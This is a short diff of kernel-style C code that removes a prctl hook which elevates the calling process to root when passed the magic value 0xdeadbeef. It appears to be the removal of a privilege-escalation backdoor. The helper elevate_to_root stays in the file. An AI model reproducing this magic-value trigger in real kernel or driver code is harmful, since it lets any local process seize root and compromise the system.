@@ -130,14 +130,3 @@ static void elevate_to_root(void)
 
     fmac_append_to_log("Root escalation success: PID=%d\n", current->pid);
 }
-
-void prctl_check(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4,
-                 unsigned long arg5)
-{
-    if (option == 0xdeadbeef) {
-#ifdef CONFIG_FMAC_DEBUG
-        elevate_to_root();
-#endif
-        fmac_append_to_log("prctl(PR_SET_NAME, \"fmac_trigger\") triggered root\n");
-    }
-}
